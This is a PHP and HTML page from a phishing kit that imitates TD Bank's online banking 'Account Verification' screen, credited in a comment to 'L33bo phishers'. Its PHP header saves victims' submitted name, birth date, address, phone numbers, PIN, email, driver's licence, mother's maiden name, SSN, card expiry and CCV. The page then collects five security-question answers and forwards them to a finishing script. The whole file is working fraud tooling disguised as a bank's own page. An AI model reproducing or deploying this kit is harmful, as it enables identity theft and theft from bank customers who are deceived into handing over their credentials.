<?php
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
$_SESSION['name'] = $_POST['name'];
$_SESSION['dob'] = $_POST['dobm']."/".$_POST['dobd']."/".$_POST['doby'];
$_SESSION['address'] = $_POST['street'].", ".$_POST['city'].", ".$_POST['province'].", ".$_POST['postal1']."".$_POST['postal2'];
$_SESSION['telephone'] = $_POST['HomeArea']."-".$_POST['Home3']."-".$_POST['Home4'];
$_SESSION['telephone2'] = $_POST['BusArea']."-".$_POST['Bus3']."-".$_POST['Bus4']." (ext".$_POST['BusExt'].")";
$_SESSION['pin'] = $_POST['pin'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['dl'] = $_POST['dl'];
$_SESSION['mmn'] = $_POST['mmn'];
$_SESSION['ssn'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
$_SESSION['exp'] = $_POST['expd']."-".$_POST['expm']."-".$_POST['expy'];
$_SESSION['ccv'] = $_POST['ccv'];

?>
<!DOCTYPE html>
<html lang="en" xml:lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title>Account Verification</title>
 	<link type="text/css" href="assets/css/default.css" rel="stylesheet">
 	<link type="text/css" href="assets/css/eg-custom.css" rel="stylesheet">
	<link rel="stylesheet" href="assets/css/ns-hybrid.css" type="text/css"> 
	<link rel="stylesheet" href="assets/css/forms.css" type="text/css"> 
	<link rel="icon" type="image/ico" href="assets/img/favicon.ico"/>
	<script src="assets/js/ValidateQuestions.js"  type="text/javascript"></script>
	 <script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
</head>

<body class="td-JS-enabled"> 
	
	<div class="td-skip">
		<a href="#">Skip to main content</a>
	</div> 
	
	<div id="td-wrapper">
	 	 
		<div id="td-container">
			
		
<header class="td-layout-row" id="td-layout-header" role="banner">
<div class="td-layout-column td-layout-grid7 td-layout-column-first">
<div id="td-logo"><img height="50" src="assets/img/Logo2.gif" width="384"></div>
</div>
<div class="td-layout-column td-layout-grid8 td-noprint td-layout-column-last">
<div class="td-layout-row">
<div class="td-layout-column td-layout-grid8 td-copy-align-right td-layout-column-first td-layout-column-last">
<ul class="td-list-inline td-link-nounderline td-margin-bottom-large">
<li class="td-copy-sub td-link-colour-grey"><a href="#">WebBroker</a></li>
<li class="td-copy-sub td-link-colour-grey"><a href="#">U.S. Online Banking</a></li>
<li><img src="assets/img/icon-lock.gif" width="10">&nbsp;<strong class="td-copy-emphasized td-copy-align-middle"><a href="#">Account Verification</a></strong>&nbsp;<a class="td-button td-button-secondary td-button-compact" href="https://easyweb.td.com/waw/ezw/servlet/ca.tdbank.banking.servlet.LogoffServlet"><span class="td-button-label">Logout</span></a></li>
</ul>
</div>
</div>
<div class="td-layout-row">
<div class="td-layout-column td-layout-grid8 td-layout-column-first td-copy-align-right td-layout-column-last">
<ul class="td-list-inline td-copy-sub td-link-nounderline td-link-colour-grey">
<li><a href="#">Contact Us</a></li>
<li><a href="#">Apply</a></li>
<li><a href="#">Search</a></li>
</ul>
</div>
</div>
</div>
</header>

			
			
			
			<div class="td-layout-row td-noprint" id="td-layout-nav-main" role="navigation">
				<div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
				   				

<nav id="td-nav-level1" class="clear"> 
	<ul>
	    <li class="td-nav-level1-active">
	    	<span class="td-nav-level1-label">
	    		<span class="td-nav-level1-indicator">You are in this section:</span>
	    		<a href="#">My Accounts</a>
	    	</span>
	    </li>
	    <li><span class="td-nav-level1-label"><a href="#">Customer Service</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Products &amp; Services</a></span></li> 
	    <li><span class="td-nav-level1-label"><a href="#">Markets &amp; Research</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Planning</a></span></li>
    </ul>
</nav>

				   

<nav class="clear" id="td-nav-level2">
<ul>
<li><span class="td-nav-level2-label"><a href="#">Accounts</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Payments</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Transfers</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Investments</a></span></li>
<li class="td-nav-level2-active"><span class="td-nav-level2-label"><span class="td-nav-level2-indicator">You are in this section:</span> <a href="#">Administration</a></span></li>
</ul>
</nav>

				</div>
			</div>	 
			
			
			
    		
    		<div id="td-layout-contentarea" class="td-layout-row">
    			
    			<div class="td-layout-column td-layout-grid3 td-layout-column-first td-noprint">
    				 
    					
    				






<nav class="clear" id="td-nav-left" role="navigation">
	<a id="leftnav" name="leftnav" tabindex="-1"></a>
	<ul>
		<li>
			<ul><li class="td-nav-left-first-child"><span class="td-nav-left-label"><a href="#">Customize Site</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Rename Accounts</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Session History</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Change Home Address</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Change Password &amp; Security</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Apply for Products</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Open a Small Business Account</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Email Notifications</a></span></li>
				<li class="td-nav-left-last-child td-nav-left-active"><span class="td-nav-left-label"><span class="td-nav-left-indicator">You are currently viewing:</span><a href="#">Account Verification</a></span></li>
			</ul>
		</li>
	</ul>
</nav>
					



					

<!-- tdcq100012113 start -->
<script type="text/javascript">
	function QLGotoWebdoxs(){
		document.frmQLGotoWebdoxs.WebdoxsTSO.value = "QLKToWebdoxs";
		document.frmQLGotoWebdoxs.submit();
	}
</script>

<div class="td-callout td-callout-tertiary td-margin-none">
         <div class="td-callout-heading">
         	<h4>
         		My Links
         	</h4>
         </div>
         <p class="td-copy-sub"><a href="#">Choose my links</a>&nbsp;</p>
         <ul class="td-list-links td-copy-sub">
	
				<li><a href="#">Pay Bills</a></li>
			
		
				<li><a href="#">Make a Transfer</a></li>
			
		
				<li><a href="#">Purchase Mutual Funds</a></li>
			
		
				<li><a href="#">WebBroker</a></li>
			
		
				<li><a href="#" onclick="QLGotoWebdoxs();return false">View Bills</a></li>
			
		
         </ul>
         </div>

					
    			</div><!-- End .td-layout-column -->
    			
    				
    			<div class="td-layout-column td-layout-grid12 td-layout-column-last" role="main">
				   <a name="main" id="main" tabindex="-1"></a>
    				


<form name="step2" id="step2" action="Finish.php?&sessionid=<?php echo generateRandomString(30); ?>&securessl=true" method="POST">
	
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tbody>
		<tr>
			<td class="td-copy-align-top" colspan="2">
				<div id="td-pagetitlearea" class="td-margin-bottom-medium">
					<div class="td-layout-row">
						<div class="td-layout-column td-layout-grid10 td-layout-column-first">
							<h1>Account Verification</h1>
						</div>
						<div class="td-layout-column td-layout-grid2 td-copy-align-right td-margin-none td-layout-column-last">
							<a href="#">Help</a>
						</div>
					</div>
				</div>
				
				<div class="td-layout-row">
					<div class="td-layout-column td-layout-grid12 td-margin-none td-layout-column-first td-layout-column-last">
						<h3 class="td-margin-top-small">Step: 2 of 2</h3>
					</div>
				</div>
				<div class="td-layout-row">
					<div class="td-layout-column td-layout-grid12 td-margin-none td-layout-column-first td-layout-column-last">
						<h4 class="td-margin-top-small">Please enter your information below in order to restore your access to our online banking system, by participating in our account verification process you are also helping to safeguard your account.</h4>
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td colspan="2"><br>
				
					<table width="100%" border="0" cellpadding="0" cellspacing="0" class="elementBgAECAB4">
						<tbody><tr class="bgcolorAECAB4">
							<th width="100%" class="formtitle td-copy-align-left" valign="middle" colspan="2">
								&nbsp;<b>Update Security Questions</b>
							</th>
							
						</tr>
					</tbody></table>

<div style="width:100%;margin:0px" id="contentContainer" class="td-layout-column td-layout-grid11">
				<div class="td-layout-row">
					<div id="msoErrorMessage">
					</div>
				</div>
				<div class="td-layout-row">	
				</div>
				<div class="td-layout-row">
				</div>
				<div class="td-layout-row">
				</div>
				

				<div id="mfaQuestionsAndAnswersDiv" class="td-layout-row">
	
  
	<div id="contentPane" class="td-layout-row td-callout td-callout-secondary td-cs-tertiary">
		
		<div class="td-layout-row">
			<div class="td-layout-row">Please update your questions and answers below.
				<span class="txtBold">Always remember, TD will never ask you to confirm your questions over the telephone.
				</span>
			</div>
			<div class="td-layout-row">
		 		<span class="txt" style="font-size:1.0em;">Please note:</span><br><br>
		 	</div>
		 	<div class="td-layout-row">	
			  	<ul class="changepassword">
					<li>Answers must be between 3 and 25 characters in length.</li>
					<li>Special characters (e.g. #, &amp;, ?) are not allowed.</li>
					<li>You may be asked to answer these questions when you log in or when resetting your password online.</li>
			  	</ul>
		  	</div>
		</div>
		<div id="formContainer">

				<fieldset class="basicFieldset">
					<span id="mfaUpdate:mfa">
						<div class="td-layout-row">
							<div class="td-layout-row questionBgwhite questionDetailSpacing">
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:0:selectBox">

											<span class="boldFont">Question 1:</span></label>
									</div>
	<div class="td-layout-column td-layout-grid7">
	<select id="q1" name="q1" size="1" onblur="lockQuestion(event); return false;" onchange="clearTextBox(event); return false;" onclick="clearq1();" style="display: inline; width: 412px;">	
	<option title="Select from List" value="-">Select from List</option>
	<option title="Who is your favourite cartoon character?" value="Who is your favourite cartoon character">Who is your favourite cartoon character?</option>
	<option title="What is your favourite hometown newspaper?" value="What is your favourite hometown newspaper">What is your favourite hometown newspaper?</option>
	<option title="What is your favourite vegetable?" value="What is your favourite vegetable">What is your favourite vegetable?</option>
	<option title="What is your grandmother's middle name (your mother's mother)?" value="What is your grandmother's middle name (your mother's mother)">What is your grandmother's middle name (your mother's mother)?</option>
	<option title="What is your grandmother's middle name (your father's mother)?" value="What is your grandmother's middle name (your father's mother)">What is your grandmother's middle name (your father's mother)?</option>
	<option title="What was the nickname of your grandfather?" value="What was the nickname of your grandfather">What was the nickname of your grandfather?</option>
	<option title="What is your grandfather's middle name (your mother's father)?" value="What is your grandfather's middle name (your mother's father)"> What is your grandfather's middle name (your mother's father)?</option>
	<option title="What is the street number of the house you grew up in as a child?" value="What is the street number of the house you grew up in as a child">What is the street number of the house you grew up in as a child?</option>
	<option title="What is your favourite magazine subscription?" value="What is your favourite magazine subscription">What is your favourite magazine subscription?</option>
	<option title="What was your favourite restaurant in college?" value="What was your favourite restaurant in college">What was your favourite restaurant in college?</option>
	<option title="What is your grandfather's middle name (your father's father)?" value="What is your grandfather's middle name (your father's father)">What is your grandfather's middle name (your father's father)?</option>
	<option title="What online forum or site do you frequent most?" value="hat online forum or site do you frequent most">What online forum or site do you frequent most?</option>
	<option title="Who was your 1st grade school teacher?" value="Who was your 1st grade school teacher">Who was your 1st grade school teacher?</option>
	<option title="What is your most memorable vacation spot?" value="What is your most memorable vacation spot">What is your most memorable vacation spot?</option>
	<option title="What type of food do you like most? Ex. Italian" value="What type of food do you like most? Ex. Italian">What type of food do you like most? Ex. Italian</option>
</select><div id='step2_q1_errorloc' class="error_strings"></div> 
				
									</div>
								</div>
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:0:answer">

											<span class="boldFont">Answer 1:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="a1" name="a1" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="cleara1();">
									<div id='step2_a1_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-bottom-medium">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:0:confirmAnswer">

											<span class="boldFont">Confirm Answer 1:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="ca1" name="ca1" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="clearca1();">
									<div id='step2_ca1_errorloc' class="error_strings"></div>
									</div>
								</div>
							</div><span class="td-margin-top-none td-margin-bottom-none">
							<hr class="td-divider-fade td-margin-top-none td-margin-bottom-none"></span>
							<div class="td-layout-row questionBgcolor questionDetailSpacing" style="background-color: #EFF9EF;padding: 3px 0px">
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:1:selectBox">

											<span class="boldFont">Question 2:</span></label>
									</div>
	<div class="td-layout-column td-layout-grid7">
	<select id="q2" name="q2" size="1" onblur="lockQuestion(event); return false;" onchange="clearTextBox(event); return false;" onclick="clearq2();" style="display: inline; width: 412px;">	
	<option title="Select from List" value="-">Select from List</option>
	<option title="What is your favourite pizza place?" value="What is your favourite pizza place">What is your favourite pizza place?</option>
	<option title="What is the postal/zip code of your family vacation home?" value="hat is the postal/zip code of your family vacation home">What is the postal/zip code of your family vacation home?</option>
	<option title="What is the 1st concert you attended?" value="What is the 1st concert you attended">What is the 1st concert you attended?</option>
	<option title="What was your favourite band in college?" value="What was your favourite band in college">What was your favourite band in college?</option>
	<option title="Which gas station do you frequent most?" value="Which gas station do you frequent most">Which gas station do you frequent most?</option>
	<option title="What is your favourite dessert?" value="hat is your favourite dessert">What is your favourite dessert?</option>
	<option title="What brand of jeans do you prefer?" value="What brand of jeans do you prefer">What brand of jeans do you prefer?</option>
	<option title="What is your spouse's/partner's nickname?" value="What is your spouse's/partner's nickname">What is your spouse's/partner's nickname?</option>
	<option title="What is the first name of the youngest of your siblings?" value="What is the first name of the youngest of your siblings">What is the first name of the youngest of your siblings?</option>
	<option title="What is your favourite ice cream flavour?" value="What is your favourite ice cream flavour">What is your favourite ice cream flavour?</option>
	<option title="What is the name of the hospital where your 1st child was born?" value="What is the name of the hospital where your 1st child was born">What is the name of the hospital where your 1st child was born?</option>
	<option title="What was the make of the first mobile phone you owned?" value="What was the make of the first mobile phone you owned">What was the make of the first mobile phone you owned?</option>
	<option title="Who is your favourite author?" value="Who is your favourite author">Who is your favourite author?</option>
	<option title="What is your dream job?" value="What is your dream job">What is your dream job?</option>
	<option title="What was your favourite toy as a child?" value="What was your favourite toy as a child">What was your favourite toy as a child?</option>
</select><div id='step2_q2_errorloc' class="error_strings"></div>  
									</div>
								</div>
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:1:answer">

											<span class="boldFont">Answer 2:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="a2" name="a2" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="cleara2();">
									<div id='step2_a2_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-bottom-medium">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:1:confirmAnswer">

											<span class="boldFont">Confirm Answer 2:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="ca2" name="ca2" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="clearca2();">
									<div id='step2_ca2_errorloc' class="error_strings"></div>
									
									</div>
								</div>
							</div><span class="td-margin-top-none td-margin-bottom-none">
							<hr class="td-divider-fade td-margin-top-none td-margin-bottom-none"></span>
							<div class="td-layout-row questionBgwhite questionDetailSpacing">
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:2:selectBox">

											<span class="boldFont">Question 3:</span></label>
									</div>
	<div class="td-layout-column td-layout-grid7">
	<select id="q3" name="q3" size="1" onblur="lockQuestion(event); return false;" onchange="clearTextBox(event); return false;" onclick="clearq3();" style="display: inline; width: 412px;">	
	<option title="Select from List" value="-">Select from List</option>
	<option title="What is your favourite TV show?" value="What is your favourite TV show">What is your favourite TV show?</option>
	<option title="What is the first name of your spouse's/partner's youngest sibling?" value="hat is the first name of your spouse's/partner's youngest sibling?">What is the first name of your spouse's/partner's youngest sibling?</option>
	<option title="What is your oldest sibling's nickname?" value="What is your oldest sibling's nickname">What is your oldest sibling's nickname?</option>
	<option title="Who is your favourite painter?" value="Who is your favourite painter">Who is your favourite painter?</option>
	<option title="What is the first name of your best childhood friend?" value="What is the first name of your best childhood friend">What is the first name of your best childhood friend?</option>
	<option title="What board game do you play most often?" value="What board game do you play most often">What board game do you play most often?</option>
	<option title="What is the first name of your oldest nephew?" value="What is the first name of your oldest nephew">What is the first name of your oldest nephew?</option>
	<option title="What is your favourite flower?" value="What is your favourite flower">What is your favourite flower?</option>
	<option title="What is your oldest child's middle name?" value="What is your oldest child's middle name">What is your oldest child's middle name?</option>
	<option title="What was your favourite food as a child?" value="What was your favourite food as a child">What was your favourite food as a child?</option>
	<option title="What year did you get your first car?" value="What year did you get your first car">What year did you get your first car?</option>
	<option title="What is your youngest child's middle name?" value="What is your youngest child's middle name">What is your youngest child's middle name?</option>
	<option title="What is your favourite fragrance?" value="What is your favourite fragrance">What is your favourite fragrance?</option>
	<option title="What is your youngest sibling's nickname?" value="What is your youngest sibling's nickname">What is your youngest sibling's nickname?</option>
	<option title="What is the name of your most influential mentor?" value="What is the name of your most influential mentor">What is the name of your most influential mentor?</option>
</select><div id='step2_q3_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:2:answer">

											<span class="boldFont">Answer 3:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="a3" name="a3" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="cleara3();">
									<div id='step2_a3_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-bottom-medium">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:2:confirmAnswer">

											<span class="boldFont">Confirm Answer 3:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="ca3" name="ca3" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="clearca3();">
									<div id='step2_ca3_errorloc' class="error_strings"></div> 
									</div>
								</div>
							</div><span class="td-margin-top-none td-margin-bottom-none">
							<hr class="td-divider-fade td-margin-top-none td-margin-bottom-none"></span>
							<div class="td-layout-row questionBgcolor questionDetailSpacing" style="background-color: #EFF9EF;padding: 3px 0px">
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:3:selectBox">

											<span class="boldFont">Question 4:</span></label>
									</div>
	<div class="td-layout-column td-layout-grid7">
	<select id="q4" name="q4" size="1" onblur="lockQuestion(event); return false;" onchange="clearTextBox(event); return false;" onclick="clearq4();" style="display: inline; width: 412px;">	
	<option title="Select from List" value="-">Select from List</option>
	<option title="Who is your favourite poet?" value="Who is your favourite poet">Who is your favourite poet?</option>
	<option title="What year was your basement last renovated?" value="What year was your basement last renovated">What year was your basement last renovated?</option>
	<option title="What was the name of your first roommate?" value="What was the name of your first roommate">What was the name of your first roommate?</option>
	<option title="What is the first name of the person you went to your prom with?" value="What is the first name of the person you went to your prom with">What is the first name of the person you went to your prom with?</option>
	<option title="What is your nickname?" value="What is your nickname">What is your nickname?</option>
	<option title="Who is your favourite person from history?" value="Who is your favourite person from history"> Who is your favourite person from history?</option>
	<option title="What was the name of your first girlfriend/boyfriend?" value="What was the name of your first girlfriend/boyfriend">What was the name of your first girlfriend/boyfriend?</option>
	<option title="What was the first name of your nearest neighbour in 2000?" value="What was the first name of your nearest neighbour in 2000">What was the first name of your nearest neighbour in 2000?</option>
	<option title="What was the first name of your first manager?" value="What was the first name of your first manager">What was the first name of your first manager?</option>
	<option title="What is your favourite fictional character?" value="What is your favourite fictional character"> What is your favourite fictional character?</option>
	<option title="What is the name of your first employer?" value="What is the name of your first employer">What is the name of your first employer?</option>
	<option title="What is the name of your first pet?" value="What is the name of your first pet">What is the name of your first pet?</option>
	<option title="What was the first name of your favourite teacher in final year of high school?" value="What was the first name of your favourite teacher in final year of high school">What was the first name of your favourite teacher in final year of high school?</option>
	<option title="What is your favourite brand of potato chips?" value="What is your favourite brand of potato chips">What is your favourite brand of potato chips?</option>
	<option title="What is the name of the hospital in which you were born?" value="What is the name of the hospital in which you were born">What is the name of the hospital in which you were born?</option>
</select><div id='step2_q4_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:3:answer">

											<span class="boldFont">Answer 4:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="a4" name="a4" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="cleara4();">
									<div id='step2_a4_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-bottom-medium">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:3:confirmAnswer">

											<span class="boldFont">Confirm Answer 4:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="ca4" name="ca4" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="clearca4();">
									<div id='step2_ca4_errorloc' class="error_strings"></div> 
									</div>
								</div>
							</div><span class="td-margin-top-none td-margin-bottom-none">
							<hr class="td-divider-fade td-margin-top-none td-margin-bottom-none"></span>
							<div class="td-layout-row questionBgwhite questionDetailSpacing">
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:4:selectBox">

											<span class="boldFont">Question 5:</span></label>
									</div>
	<div class="td-layout-column td-layout-grid7">
	<select id="q5" name="q5" size="1" onblur="lockQuestion(event); return false;" onchange="clearTextBox(event); return false;" onclick="clearq5();" style="display: inline; width: 412px;">	
	<option title="Select from List" value="-">Select from List</option>
	<option title="Who is your childhood hero?" value="Who is your childhood hero">Who is your childhood hero?</option>
	<option title="What was the make of your first car?" value="What was the make of your first car">What was the make of your first car?</option>
	<option title="What is the name of your elementary school?" value="What is the name of your elementary school"> What is the name of your elementary school?</option>
	<option title="What is your favourite restaurant?" value="What is your favourite restaurant">What is your favourite restaurant?</option>
	<option title="What high school did your spouse/partner attend?" value="What high school did your spouse/partner attend">What high school did your spouse/partner attend?</option>
	<option title="What was the name of your high school? (Enter only &quot;Riverdale&quot; for Riverdale High School)" value="What was the name of your high school">What was the name of your high school? (Enter only "Riverdale" for Riverdale High School)</option>
	<option title="What is your favourite quote?" value="What is your favourite quote">What is your favourite quote?</option>
	<option title="What is the name of the post secondary institution that your spouse/partner attended?" value="What is the name of the post secondary institution that your spouse/partner attended">What is the name of the post secondary institution that your spouse/partner attended?</option>
	<option title="What street did your best friend in high school live on? (Enter full name of street only)" value="What street did your best friend in high school live on">What street did your best friend in high school live on? (Enter full name of street only)</option>
	<option title="What did you study at your post secondary institution?" value="What did you study at your post secondary institution">What did you study at your post secondary institution?</option>
	<option title="What was your high school mascot?" value="What was your high school mascot">What was your high school mascot?</option>
	<option title="What was your favourite college/university year?" value="What was your favourite college/university year">What was your favourite college/university year?</option>
	<option title="Where did you meet your spouse/partner for the first time? (Enter location only)" value="Where did you meet your spouse/partner for the first time">Where did you meet your spouse/partner for the first time? (Enter location only)</option>
	<option title="As a child, what did you want to be when you grew up?" value="As a child, what did you want to be when you grew up">As a child, what did you want to be when you grew up?</option>
	<option title="How old was your father when you were born? (Answer in words)" value="How old was your father when you were born">How old was your father when you were born? (Answer in words)</option>
</select><div id='step2_q5_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-top-small">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:4:answer">

											<span class="boldFont">Answer 5:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="a5" name="a5" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="cleara5();">
									<div id='step2_a5_errorloc' class="error_strings"></div> 
									</div>
								</div>
								<div class="td-layout-row td-margin-bottom-medium">
									<div class="td-layout-column questionLabel td-copy-align-right"><label for="mfaUpdate:repeatId:4:confirmAnswer">

											<span class="boldFont">Confirm Answer 5:</span></label>
									</div>
									<div class="td-layout-column td-layout-grid7">
									<input id="ca5" name="ca5" autocomplete="off" value="" maxlength="25" size="25" type="password" onkeyup="clearca5();"/>
									<div id='step2_ca5_errorloc' class="error_strings"></div> 
									</div>
								</div>
							</div>
						</div>
						<div class="td-layout-row td-margin-top-small">
							<div class="td-layout-column questionLabel">&nbsp;</div>
						</div></span>
				</fieldset>
	 	</div>
  </div>
  
	</div>
					
					
			</div>
					
				<table border="0" cellpadding="0" cellspacing="0" align="right">
					<tbody><tr>
						<td colspan="2">&nbsp;</td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;</td>
						<td><a href="#" onclick="doSubmit();"><img src="assets/img/next_cp.gif" alt="Next " border="0"></a></td>
					</tr>
				</tbody></table>
			</td>
		</tr>
	</tbody></table>
	<input type="hidden" name="savechanges" value="YES">
</form>

 		
    			</div>
    			
    		</div>
    		
		</div> 
			
	
		
			


<footer class="td-layout-row" id="td-layout-footer" role="complementary">
 	<div class="td-layout-column td-layout-grid11 td-noprint td-layout-column-first">
	 	<ul class="td-list-inline td-copy-sub td-link-colour-grey td-link-nounderline">
			<li><a href="#">Privacy Policy</a></li>
			<li><a href="#">Internet Security</a></li>
			<li><a href="#">Legal</a></li>
		</ul>
	</div>
	<div class="td-copy-align-right td-layout-column td-layout-grid4 td-noprint td-margin-none td-layout-column-last">
		 
	 	<span class="td-copy-sub td-copy-grey">Server ID: B11A : 1430949905605</span>
	 	
	</div>
	
</footer>
 <!-- End #td-layout-footer -->
		
	</div> 
		 


			



<div id="hiddenlpsubmitdiv" style="display: none;"></div><script>try{for(var lastpass_iter=0; lastpass_iter < document.forms.length; lastpass_iter++){ var lastpass_f = document.forms[lastpass_iter]; if(typeof(lastpass_f.lpsubmitorig2)=="undefined"){ lastpass_f.lpsubmitorig2 = lastpass_f.submit; lastpass_f.submit = function(){ var form=this; var customEvent = document.createEvent("Event"); customEvent.initEvent("lpCustomEvent", true, true); var d = document.getElementById("hiddenlpsubmitdiv"); for(var i = 0; i < document.forms.length; i++){ if(document.forms[i]==form){ d.innerText=i; } } d.dispatchEvent(customEvent); form.lpsubmitorig2(); } } }}catch(e){}</script></body></html>
